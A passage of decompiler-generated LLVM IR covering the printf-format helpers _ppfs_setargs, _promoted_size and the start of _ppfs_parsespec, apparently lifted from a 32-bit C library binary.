  %v3_805196c = inttoptr i32 %v2_805196c to i32*
  store i32 %arg2, i32* %v3_805196c, align 4
  %tmp8 = icmp slt i32 %v3_8051969, 1
  br i1 %tmp8, label %dec_label_pc_805199a, label %dec_label_pc_8051973

dec_label_pc_8051973:                             ; preds = %entry
  %v1_8051976 = load i32, i32* @ebx, align 4
  %v2_8051976 = add i32 %v1_8051976, 28
  %v3_8051976 = inttoptr i32 %v2_8051976 to i32*
  store i32 %v3_8051969, i32* %v3_8051976, align 4
  %v0_8051979 = load i32, i32* @ebx, align 4
  %v1_8051979 = add i32 %v0_8051979, 24
  %v2_8051979 = inttoptr i32 %v1_8051979 to i32*
  store i32 0, i32* %v2_8051979, align 4
  %v0_8051980 = load i32, i32* @ebx, align 4
  %v1_8051980 = add i32 %v0_8051980, 4
  %v2_8051980 = inttoptr i32 %v1_8051980 to i32*
  store i32 0, i32* %v2_8051980, align 4
  %v0_8051987 = load i32, i32* @ebx, align 4
  %v1_8051987 = add i32 %v0_8051987, 8
  %v2_8051987 = inttoptr i32 %v1_8051987 to i32*
  store i32 0, i32* %v2_8051987, align 4
  %v0_805198e = load i32, i32* @ebx, align 4
  %v1_805198f = call i32 @_ppfs_setargs(i32 %v0_805198e)
  %v1_8051994 = load i32, i32* @ebx, align 4
  %v2_8051994 = add i32 %v1_8051994, 24
  %v3_8051994 = inttoptr i32 %v2_8051994 to i32*
  store i32 %v3_8051969, i32* %v3_8051994, align 4
  br label %dec_label_pc_805199a

dec_label_pc_805199a:                             ; preds = %entry, %dec_label_pc_8051973
  %v2_805199a = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_805195d, i32* @ebx, align 4
  store i32 %v0_805195c, i32* @esi, align 4
  ret i32 %v2_805199a

; uselistorder directives
  uselistorder i32 %v3_8051969, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805199a, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80519a1 = load i32, i32* @ebx, align 4
  store i32 %v0_80519a1, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_80519a6 = add i32 %arg1, 80
  store i32 %v1_80519a6, i32* %ebx.global-to-local, align 4
  %v1_80519a9 = add i32 %arg1, 24
  %v2_80519a9 = inttoptr i32 %v1_80519a9 to i32*
  %v3_80519a9 = load i32, i32* %v2_80519a9, align 4
  %v4_80519a9 = icmp eq i32 %v3_80519a9, 0
  %v1_80519ad = icmp eq i1 %v4_80519a9, false
  %v1_8051a63 = add i32 %arg1, 8
  %v2_8051a63 = inttoptr i32 %v1_8051a63 to i32*
  %v3_8051a63 = load i32, i32* %v2_8051a63, align 4
  %v8_8051a63 = icmp eq i32 %v3_8051a63, -2147483648
  %v1_8051a6a = icmp eq i1 %v8_8051a63, false
  br i1 %v1_80519ad, label %dec_label_pc_8051a63, label %dec_label_pc_80519b3

dec_label_pc_80519b3:                             ; preds = %entry
  br i1 %v1_8051a6a, label %dec_label_pc_80519cd, label %dec_label_pc_80519bc

dec_label_pc_80519bc:                             ; preds = %dec_label_pc_80519b3
  %v1_80519bc = add i32 %arg1, 76
  %v2_80519bc = inttoptr i32 %v1_80519bc to i32*
  %v3_80519bc = load i32, i32* %v2_80519bc, align 4
  store i32 %v3_80519bc, i32* %eax.global-to-local, align 4
  %v1_80519bf = add i32 %v3_80519bc, 4
  store i32 %v1_80519bf, i32* %edx.global-to-local, align 4
  store i32 %v1_80519bf, i32* %v2_80519bc, align 4
  %v0_80519c5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80519c5 = inttoptr i32 %v0_80519c5 to i32*
  %v2_80519c5 = load i32, i32* %v1_80519c5, align 4
  store i32 %v2_80519c5, i32* %eax.global-to-local, align 4
  %v1_80519c7 = load i32, i32* @ecx, align 4
  %v2_80519c7 = add i32 %v1_80519c7, 80
  %v3_80519c7 = inttoptr i32 %v2_80519c7 to i32*
  store i32 %v2_80519c5, i32* %v3_80519c7, align 4
  %v0_80519ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80519ca = load i32, i32* @ecx, align 4
  %v2_80519ca = add i32 %v1_80519ca, 8
  %v3_80519ca = inttoptr i32 %v2_80519ca to i32*
  store i32 %v0_80519ca, i32* %v3_80519ca, align 4
  %v0_80519cd.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80519cd

dec_label_pc_80519cd:                             ; preds = %dec_label_pc_80519b3, %dec_label_pc_80519bc
  %v1_80519dc = phi i32 [ %arg1, %dec_label_pc_80519b3 ], [ %v0_80519cd.pre, %dec_label_pc_80519bc ]
  %v1_80519cd = add i32 %v1_80519dc, 4
  %v2_80519cd = inttoptr i32 %v1_80519cd to i32*
  %v3_80519cd = load i32, i32* %v2_80519cd, align 4
  %v8_80519cd = icmp eq i32 %v3_80519cd, -2147483648
  %v1_80519d4 = icmp eq i1 %v8_80519cd, false
  br i1 %v1_80519d4, label %dec_label_pc_80519e7, label %dec_label_pc_80519d6

dec_label_pc_80519d6:                             ; preds = %dec_label_pc_80519cd
  %v1_80519d6 = add i32 %v1_80519dc, 76
  %v2_80519d6 = inttoptr i32 %v1_80519d6 to i32*
  %v3_80519d6 = load i32, i32* %v2_80519d6, align 4
  store i32 %v3_80519d6, i32* %eax.global-to-local, align 4
  %v1_80519d9 = add i32 %v3_80519d6, 4
  store i32 %v1_80519d9, i32* %edx.global-to-local, align 4
  store i32 %v1_80519d9, i32* %v2_80519d6, align 4
  %v0_80519df = load i32, i32* %eax.global-to-local, align 4
  %v1_80519df = inttoptr i32 %v0_80519df to i32*
  %v2_80519df = load i32, i32* %v1_80519df, align 4
  store i32 %v2_80519df, i32* %eax.global-to-local, align 4
  %v1_80519e1 = load i32, i32* @ecx, align 4
  %v2_80519e1 = add i32 %v1_80519e1, 80
  %v3_80519e1 = inttoptr i32 %v2_80519e1 to i32*
  store i32 %v2_80519df, i32* %v3_80519e1, align 4
  %v0_80519e4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80519e4 = load i32, i32* @ecx, align 4
  %v2_80519e4 = add i32 %v1_80519e4, 4
  %v3_80519e4 = inttoptr i32 %v2_80519e4 to i32*
  store i32 %v0_80519e4, i32* %v3_80519e4, align 4
  %v1_8051a5c17.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80519e7

dec_label_pc_80519e7:                             ; preds = %dec_label_pc_80519cd, %dec_label_pc_80519d6
  %v1_8051a5c17 = phi i32 [ %v1_80519dc, %dec_label_pc_80519cd ], [ %v1_8051a5c17.pre, %dec_label_pc_80519d6 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8051a5c18 = add i32 %v1_8051a5c17, 28
  %v3_8051a5c19 = inttoptr i32 %v2_8051a5c18 to i32*
  %v4_8051a5c20 = load i32, i32* %v3_8051a5c19, align 4
  %v5_8051a5f21 = icmp sgt i32 %v4_8051a5c20, 0
  br i1 %v5_8051a5f21, label %dec_label_pc_80519eb, label %dec_label_pc_8051a91.loopexit

dec_label_pc_80519eb:                             ; preds = %dec_label_pc_80519e7, %dec_label_pc_8051a5b
  %v1_8051a5c23 = phi i32 [ %v1_8051a5c, %dec_label_pc_8051a5b ], [ %v1_8051a5c17, %dec_label_pc_80519e7 ]
  %v1_80519eb22 = phi i32 [ %v1_8051a5b, %dec_label_pc_8051a5b ], [ 0, %dec_label_pc_80519e7 ]
  %v2_80519eb = mul i32 %v1_80519eb22, 4
  %v3_80519eb = add i32 %v2_80519eb, 40
  %v4_80519eb = add i32 %v3_80519eb, %v1_8051a5c23
  %v5_80519eb = inttoptr i32 %v4_80519eb to i32*
  %v6_80519eb = load i32, i32* %v5_80519eb, align 4
  store i32 %v6_80519eb, i32* %eax.global-to-local, align 4
  %v1_80519ef = add i32 %v6_80519eb, -8
  %v9_80519ef = icmp eq i32 %v1_80519ef, 0
  br i1 %v9_80519ef, label %dec_label_pc_8051a5b, label %dec_label_pc_80519f4

dec_label_pc_80519f4:                             ; preds = %dec_label_pc_80519eb
  %v10_80519ef = icmp slt i32 %v1_80519ef, 0
  %v6_80519ef = sub i32 7, %v6_80519eb
  %v7_80519ef = and i32 %v6_80519ef, %v6_80519eb
  %v8_80519ef = icmp slt i32 %v7_80519ef, 0
  %v1_80519f4 = add i32 %v1_8051a5c23, 76
  %v2_80519f4 = inttoptr i32 %v1_80519f4 to i32*
  %v3_80519f4 = load i32, i32* %v2_80519f4, align 4
  store i32 %v3_80519f4, i32* %edx.global-to-local, align 4
  %v3_80519f7 = icmp eq i1 %v10_80519ef, %v8_80519ef
  br i1 %v3_80519f7, label %dec_label_pc_8051a07, label %dec_label_pc_80519f9

dec_label_pc_80519f9:                             ; preds = %dec_label_pc_80519f4
  %tmp15 = icmp slt i32 %v6_80519eb, 3
  %v9_8051a00 = icmp eq i32 %v6_80519eb, 7
  %v1_8051a03 = icmp eq i1 %v9_8051a00, false
  %or.cond = or i1 %tmp15, %v1_8051a03
  br i1 %or.cond, label %dec_label_pc_8051a4e, label %dec_label_pc_8051a30

dec_label_pc_8051a07:                             ; preds = %dec_label_pc_80519f4
  %tmp16 = icmp sgt i32 %v6_80519eb, 1024
  br i1 %tmp16, label %dec_label_pc_8051a10, label %dec_label_pc_8051a4e

dec_label_pc_8051a10:                             ; preds = %dec_label_pc_8051a07
  %v6_8051a10 = icmp eq i32 %v6_80519eb, 2048
  br i1 %v6_8051a10, label %dec_label_pc_8051a20, label %dec_label_pc_8051a17

dec_label_pc_8051a17:                             ; preds = %dec_label_pc_8051a10
  %v9_8051a17 = icmp eq i32 %v6_80519eb, 2055
  %v1_8051a1c = icmp eq i1 %v9_8051a17, false
  br i1 %v1_8051a1c, label %dec_label_pc_8051a4e, label %dec_label_pc_8051a3f

dec_label_pc_8051a20:                             ; preds = %dec_label_pc_8051a10
  %v1_8051a20 = add i32 %v3_80519f4, 8
  store i32 %v1_8051a20, i32* %eax.global-to-local, align 4
  store i32 %v1_8051a20, i32* %v2_80519f4, align 4
  %v0_8051a26 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051a26 = inttoptr i32 %v0_8051a26 to i32*
  %v2_8051a26 = load i32, i32* %v1_8051a26, align 4
  store i32 %v2_8051a26, i32* %eax.global-to-local, align 4
  %v1_8051a28 = add i32 %v0_8051a26, 4
  %v2_8051a28 = inttoptr i32 %v1_8051a28 to i32*
  %v3_8051a28 = load i32, i32* %v2_8051a28, align 4
  store i32 %v3_8051a28, i32* %edx.global-to-local, align 4
  %v1_8051a2b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051a2b = add i32 %v1_8051a2b, 4
  %v3_8051a2b = inttoptr i32 %v2_8051a2b to i32*
  store i32 %v3_8051a28, i32* %v3_8051a2b, align 4
  %v0_8051a56.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051a56

dec_label_pc_8051a30:                             ; preds = %dec_label_pc_80519f9
  %v3_8051a30 = load i32, i32* %v2_80519f4, align 4
  store i32 %v3_8051a30, i32* %edx.global-to-local, align 4
  %v1_8051a33 = add i32 %v3_8051a30, 8
  store i32 %v1_8051a33, i32* %eax.global-to-local, align 4
  store i32 %v1_8051a33, i32* %v2_80519f4, align 4
  %v0_8051a39 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051a39 = inttoptr i32 %v0_8051a39 to double*
  %v2_8051a39 = load double, double* %v1_8051a39, align 4
  %v2_8051a3b = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051a3b = inttoptr i32 %v2_8051a3b to double*
  store double %v2_8051a39, double* %v4_8051a3b, align 4
  br label %dec_label_pc_8051a58

dec_label_pc_8051a3f:                             ; preds = %dec_label_pc_8051a17
  %v3_8051a3f = load i32, i32* %v2_80519f4, align 4
  store i32 %v3_8051a3f, i32* %edx.global-to-local, align 4
  %v1_8051a42 = add i32 %v3_8051a3f, 12
  store i32 %v1_8051a42, i32* %eax.global-to-local, align 4
  store i32 %v1_8051a42, i32* %v2_80519f4, align 4
  %v0_8051a48 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051a48 = inttoptr i32 %v0_8051a48 to x86_fp80*
  %v2_8051a48 = load x86_fp80, x86_fp80* %v1_8051a48, align 4
  %v2_8051a4a = load i32, i32* %ebx.global-to-local, align 4
  %v3_8051a4a = inttoptr i32 %v2_8051a4a to x86_fp80*
  store x86_fp80 %v2_8051a48, x86_fp80* %v3_8051a4a, align 4
  br label %dec_label_pc_8051a58

dec_label_pc_8051a4e:                             ; preds = %dec_label_pc_80519f9, %dec_label_pc_8051a07, %dec_label_pc_8051a17
  %v1_8051a4e = add i32 %v3_80519f4, 4
  store i32 %v1_8051a4e, i32* %eax.global-to-local, align 4
  store i32 %v1_8051a4e, i32* %v2_80519f4, align 4
  %v0_8051a54 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051a54 = inttoptr i32 %v0_8051a54 to i32*
  %v2_8051a54 = load i32, i32* %v1_8051a54, align 4
  store i32 %v2_8051a54, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051a56

dec_label_pc_8051a56:                             ; preds = %dec_label_pc_8051a20, %dec_label_pc_8051a4e
  %v0_8051a56 = phi i32 [ %v0_8051a56.pre, %dec_label_pc_8051a20 ], [ %v2_8051a54, %dec_label_pc_8051a4e ]
  %v1_8051a56 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051a56 = inttoptr i32 %v1_8051a56 to i32*
  store i32 %v0_8051a56, i32* %v2_8051a56, align 4
  %v0_8051a58.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051a58

dec_label_pc_8051a58:                             ; preds = %dec_label_pc_8051a3f, %dec_label_pc_8051a30, %dec_label_pc_8051a56
  %v0_8051a58 = phi i32 [ %v2_8051a4a, %dec_label_pc_8051a3f ], [ %v2_8051a3b, %dec_label_pc_8051a30 ], [ %v0_8051a58.pre, %dec_label_pc_8051a56 ]
  %v1_8051a58 = add i32 %v0_8051a58, 12
  store i32 %v1_8051a58, i32* %ebx.global-to-local, align 4
  %v0_8051a5b.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8051a5c.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051a5b

dec_label_pc_8051a5b:                             ; preds = %dec_label_pc_80519eb, %dec_label_pc_8051a58
  %v1_8051a5c = phi i32 [ %v1_8051a5c23, %dec_label_pc_80519eb ], [ %v1_8051a5c.pre, %dec_label_pc_8051a58 ]
  %v0_8051a5b = phi i32 [ %v1_80519eb22, %dec_label_pc_80519eb ], [ %v0_8051a5b.pre, %dec_label_pc_8051a58 ]
  %v1_8051a5b = add i32 %v0_8051a5b, 1
  store i32 %v1_8051a5b, i32* %esi.global-to-local, align 4
  %v2_8051a5c = add i32 %v1_8051a5c, 28
  %v3_8051a5c = inttoptr i32 %v2_8051a5c to i32*
  %v4_8051a5c = load i32, i32* %v3_8051a5c, align 4
  %v5_8051a5f = icmp slt i32 %v1_8051a5b, %v4_8051a5c
  br i1 %v5_8051a5f, label %dec_label_pc_80519eb, label %dec_label_pc_8051a91.loopexit

dec_label_pc_8051a63:                             ; preds = %entry
  br i1 %v1_8051a6a, label %dec_label_pc_8051a7a, label %dec_label_pc_8051a6c

dec_label_pc_8051a6c:                             ; preds = %dec_label_pc_8051a63
  %v1_8051a6c = add i32 %arg1, 36
  %v2_8051a6c = inttoptr i32 %v1_8051a6c to i8*
  %v3_8051a6c = load i8, i8* %v2_8051a6c, align 1
  %v2_8051a70 = zext i8 %v3_8051a6c to i32
  %v3_8051a70 = mul nuw nsw i32 %v2_8051a70, 12
  store i32 %v3_8051a70, i32* %eax.global-to-local, align 4
  %v2_8051a73 = add i32 %arg1, 68
  %v3_8051a73 = add i32 %v2_8051a73, %v3_8051a70
  %v4_8051a73 = inttoptr i32 %v3_8051a73 to i32*
  %v5_8051a73 = load i32, i32* %v4_8051a73, align 4
  store i32 %v5_8051a73, i32* %eax.global-to-local, align 4
  store i32 %v5_8051a73, i32* %v2_8051a63, align 4
  %v0_8051a7a.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051a7a

dec_label_pc_8051a7a:                             ; preds = %dec_label_pc_8051a63, %dec_label_pc_8051a6c
  %v1_8051a8e = phi i32 [ %arg1, %dec_label_pc_8051a63 ], [ %v0_8051a7a.pre, %dec_label_pc_8051a6c ]
  %v1_8051a7a = add i32 %v1_8051a8e, 4
  %v2_8051a7a = inttoptr i32 %v1_8051a7a to i32*
  %v3_8051a7a = load i32, i32* %v2_8051a7a, align 4
  %v8_8051a7a = icmp eq i32 %v3_8051a7a, -2147483648
  %v1_8051a81 = icmp eq i1 %v8_8051a7a, false
  br i1 %v1_8051a81, label %dec_label_pc_8051a91, label %dec_label_pc_8051a83

dec_label_pc_8051a83:                             ; preds = %dec_label_pc_8051a7a
  %v1_8051a83 = add i32 %v1_8051a8e, 37
  %v2_8051a83 = inttoptr i32 %v1_8051a83 to i8*
  %v3_8051a83 = load i8, i8* %v2_8051a83, align 1
  %v2_8051a87 = zext i8 %v3_8051a83 to i32
  %v3_8051a87 = mul nuw nsw i32 %v2_8051a87, 12
  store i32 %v3_8051a87, i32* %eax.global-to-local, align 4
  %v1_8051a8a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051a8a = add nsw i32 %v3_8051a87, -12
  %v3_8051a8a = add i32 %v2_8051a8a, %v1_8051a8a
  %v4_8051a8a = inttoptr i32 %v3_8051a8a to i32*
  %v5_8051a8a = load i32, i32* %v4_8051a8a, align 4
  store i32 %v5_8051a8a, i32* %eax.global-to-local, align 4
  store i32 %v5_8051a8a, i32* %v2_8051a7a, align 4
  %v0_8051a91.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051a91

dec_label_pc_8051a91.loopexit:                    ; preds = %dec_label_pc_8051a5b, %dec_label_pc_80519e7
  %v1_8051a5c.lcssa = phi i32 [ %v1_8051a5c17, %dec_label_pc_80519e7 ], [ %v1_8051a5c, %dec_label_pc_8051a5b ]
  br label %dec_label_pc_8051a91

dec_label_pc_8051a91:                             ; preds = %dec_label_pc_8051a91.loopexit, %dec_label_pc_8051a7a, %dec_label_pc_8051a83
  %v10_8051a98 = phi i32 [ %v1_8051a5c.lcssa, %dec_label_pc_8051a91.loopexit ], [ %v1_8051a8e, %dec_label_pc_8051a7a ], [ %v0_8051a91.pre, %dec_label_pc_8051a83 ]
  %v1_8051a91 = add i32 %v10_8051a98, 8
  %v2_8051a91 = inttoptr i32 %v1_8051a91 to i32*
  %v3_8051a91 = load i32, i32* %v2_8051a91, align 4
  store i32 %v3_8051a91, i32* %eax.global-to-local, align 4
  %v2_8051a94 = icmp slt i32 %v3_8051a91, 0
  %v1_8051a96 = icmp eq i1 %v2_8051a94, false
  br i1 %v1_8051a96, label %dec_label_pc_8051aac, label %dec_label_pc_8051a98

dec_label_pc_8051a98:                             ; preds = %dec_label_pc_8051a91
  %v1_8051a98 = add i32 %v10_8051a98, 16
  %v2_8051a98 = inttoptr i32 %v1_8051a98 to i32*
  %v3_8051a98 = load i32, i32* %v2_8051a98, align 4
  %v4_8051a98 = or i32 %v3_8051a98, 8
  store i32 %v4_8051a98, i32* %v2_8051a98, align 4
  %v0_8051a9c = load i32, i32* @ecx, align 4
  %v1_8051a9c = add i32 %v0_8051a9c, 16
  %v2_8051a9c = inttoptr i32 %v1_8051a9c to i32*
  %v3_8051a9c = load i32, i32* %v2_8051a9c, align 4
  %v4_8051a9c = and i32 %v3_8051a9c, -2
  store i32 %v4_8051a9c, i32* %v2_8051a9c, align 4
  %v0_8051aa0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051aa0 = sub i32 0, %v0_8051aa0
  store i32 %v1_8051aa0, i32* %eax.global-to-local, align 4
  %v1_8051aa2 = load i32, i32* @ecx, align 4
  %v2_8051aa2 = add i32 %v1_8051aa2, 8
  %v3_8051aa2 = inttoptr i32 %v2_8051aa2 to i32*
  store i32 %v1_8051aa0, i32* %v3_8051aa2, align 4
  %v0_8051aa5 = load i32, i32* @ecx, align 4
  %v1_8051aa5 = add i32 %v0_8051aa5, 20
  %v2_8051aa5 = inttoptr i32 %v1_8051aa5 to i32*
  store i32 32, i32* %v2_8051aa5, align 4
  %v0_8051aae.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051aac

dec_label_pc_8051aac:                             ; preds = %dec_label_pc_8051a91, %dec_label_pc_8051a98
  %v0_8051aae = phi i32 [ %v3_8051a91, %dec_label_pc_8051a91 ], [ %v0_8051aae.pre, %dec_label_pc_8051a98 ]
  %v2_8051aac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051aac, i32* @ebx, align 4
  ret i32 %v0_8051aae

; uselistorder directives
  uselistorder i32 %v3_8051a87, { 1, 0 }
  uselistorder i32 %v3_8051a70, { 1, 0 }
  uselistorder i32 %v1_8051a5b, { 2, 1, 0 }
  uselistorder i32 %v1_8051a5c, { 0, 2, 1 }
  uselistorder i32 %v3_80519f4, { 1, 0, 2 }
  uselistorder i32* %v2_80519f4, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_80519ef, { 1, 0 }
  uselistorder i32 %v6_80519eb, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_80519eb22, { 1, 0 }
  uselistorder i1 %v1_8051a6a, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_8051aac, { 1, 0 }
  uselistorder label %dec_label_pc_8051a91, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051a7a, { 1, 0 }
  uselistorder label %dec_label_pc_8051a5b, { 1, 0 }
  uselistorder label %dec_label_pc_8051a58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051a56, { 1, 0 }
  uselistorder label %dec_label_pc_8051a4e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80519eb, { 1, 0 }
  uselistorder label %dec_label_pc_80519e7, { 1, 0 }
  uselistorder label %dec_label_pc_80519cd, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8051ab0 = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051ab7

dec_label_pc_8051ab7:                             ; preds = %dec_label_pc_8051ab7, %entry
  %v0_8051ab7 = phi i32 [ ptrtoint (i8** @global_var_80598ca.482 to i32), %entry ], [ %v1_8051ab7, %dec_label_pc_8051ab7 ]
  %v1_8051ab7 = add i32 %v0_8051ab7, -2
  %v1_8051aba = inttoptr i32 %v1_8051ab7 to i16*
  %v2_8051aba = load i16, i16* %v1_8051aba, align 2
  %v3_8051aba = sext i16 %v2_8051aba to i32
  %v12_8051abd = icmp ne i32 %v3_8051aba, %v0_8051ab0
  %v6_8051ac7 = icmp ugt i32 %v1_8051ab7, ptrtoint (i32* @global_var_80598b2.483 to i32)
  %or.cond = and i1 %v6_8051ac7, %v12_8051abd
  br i1 %or.cond, label %dec_label_pc_8051ab7, label %dec_label_pc_8051ac9

dec_label_pc_8051ac9:                             ; preds = %dec_label_pc_8051ab7
  %.pre = add i32 %v0_8051ab7, -134584500
  %v2_8051acf = sdiv i32 %.pre, 2
  store i32 %v2_8051acf, i32* @edx, align 4
  %v1_8051ad1 = add i32 %v2_8051acf, ptrtoint (i8** @global_var_80598ca.482 to i32)
  %v2_8051ad1 = inttoptr i32 %v1_8051ad1 to i8*
  %v3_8051ad1 = load i8, i8* %v2_8051ad1, align 1
  %v4_8051ad1 = zext i8 %v3_8051ad1 to i32
  ret i32 %v4_8051ad1

; uselistorder directives
  uselistorder i32 %v2_8051acf, { 1, 0 }
  uselistorder i32 %v1_8051ab7, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80598ca.482 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051ada = load i32, i32* @edi, align 4
  %v0_8051adb = load i32, i32* @esi, align 4
  %v0_8051adc = load i32, i32* @ebx, align 4
  store i32 %v0_8051adc, i32* %stack_var_-16, align 4
  %v4_8051adc = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8051b08 = add i32 %tmp76, 24
  %v2_8051b08 = inttoptr i32 %v1_8051b08 to i32*
  %v3_8051b08 = load i32, i32* %v2_8051b08, align 4
  store i32 %v3_8051b08, i32* %eax.global-to-local, align 4
  %v1_8051b0f = add i32 %tmp76, 16
  %v2_8051b0f = inttoptr i32 %v1_8051b0f to i32*
  %v3_8051b0f = load i32, i32* %v2_8051b0f, align 4
  %v1_8051b12 = and i32 %v3_8051b0f, 128
  %v2_8051b12 = icmp eq i32 %v1_8051b12, 0
  store i32 %v1_8051b12, i32* %edi.global-to-local, align 4
  %v1_8051b18 = icmp eq i1 %v2_8051b12, false
  br i1 %v1_8051b18, label %dec_label_pc_8051b2b, label %dec_label_pc_8051b1a

dec_label_pc_8051b1a:                             ; preds = %entry
  %v2_8051b1a = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8051b78.outer

dec_label_pc_8051b25:                             ; preds = %dec_label_pc_8051cb3
  %v1_8051b25 = add i32 %v0_8051cb3.pre.pre, 1
  store i32 %v1_8051b25, i32* @esi, align 4
  br label %dec_label_pc_8051cc3

dec_label_pc_8051b2b:                             ; preds = %entry
  %v15_8051add = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051b2d

dec_label_pc_8051b2d:                             ; preds = %dec_label_pc_8051b55.dec_label_pc_8051b2d_crit_edge, %dec_label_pc_8051b2b
  %v2_8051b3e = phi i32 [ %v2_8051b3e.pre, %dec_label_pc_8051b55.dec_label_pc_8051b2d_crit_edge ], [ %v15_8051add, %dec_label_pc_8051b2b ]
  %v3_8051b3e = phi i32 [ %v1_8051b55, %dec_label_pc_8051b55.dec_label_pc_8051b2d_crit_edge ], [ 0, %dec_label_pc_8051b2b ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8051b31 = mul i32 %v3_8051b3e, 4
  store i32 %v1_8051b31, i32* @ecx, align 4
  %v2_8051b38 = load i32, i32* %arg1, align 4
  store i32 %v2_8051b38, i32* @edx, align 4
  %v2_8051b3a = add i32 %v1_8051b31, -4
  %v3_8051b3a = add i32 %v2_8051b3a, %v2_8051b38
  %v4_8051b3a = inttoptr i32 %v3_8051b3a to i32*
  %v5_8051b3a = load i32, i32* %v4_8051b3a, align 4
  store i32 %v5_8051b3a, i32* %eax.global-to-local, align 4
  %v1_8051b3e = trunc i32 %v5_8051b3a to i8
  %v4_8051b3e = add i32 %v2_8051b3e, 36
  %v5_8051b3e = add i32 %v4_8051b3e, %v3_8051b3e
  %v6_8051b3e = inttoptr i32 %v5_8051b3e to i8*
  store i8 %v1_8051b3e, i8* %v6_8051b3e, align 1
  %v0_8051b42 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b42 = urem i32 %v0_8051b42, 256
  %v2_8051b42 = load i32, i32* @ebx, align 4
  %v3_8051b42 = and i32 %v2_8051b42, -256
  %v4_8051b42 = or i32 %v3_8051b42, %v1_8051b42
  store i32 %v4_8051b42, i32* @ebx, align 4
  %v1_8051b44 = mul i32 %v0_8051b42, 16777216
  %v2_8051b44 = sdiv i32 %v1_8051b44, 16777216
  store i32 %v2_8051b44, i32* %eax.global-to-local, align 4
  %v1_8051b47 = load i32, i32* @edx, align 4
  %v2_8051b47 = load i32, i32* @ecx, align 4
  %v3_8051b47 = add i32 %v1_8051b47, -4
  %v4_8051b47 = add i32 %v3_8051b47, %v2_8051b47
  %v5_8051b47 = inttoptr i32 %v4_8051b47 to i32*
  %v6_8051b47 = load i32, i32* %v5_8051b47, align 4
  %v17_8051b47 = icmp eq i32 %v2_8051b44, %v6_8051b47
  %v1_8051b4b = icmp eq i1 %v17_8051b47, false
  br i1 %v1_8051b4b, label %dec_label_pc_8051e94, label %dec_label_pc_8051b51

dec_label_pc_8051b51:                             ; preds = %dec_label_pc_8051b2d
  %v3_8051b51 = trunc i32 %v0_8051b42 to i8
  %v4_8051b51 = icmp eq i8 %v3_8051b51, 0
  br i1 %v4_8051b51, label %dec_label_pc_8051b5b, label %dec_label_pc_8051b55

dec_label_pc_8051b55:                             ; preds = %dec_label_pc_8051b51
  %v0_8051b55 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051b55 = add i32 %v0_8051b55, 1
  store i32 %v1_8051b55, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_8051b55, 32
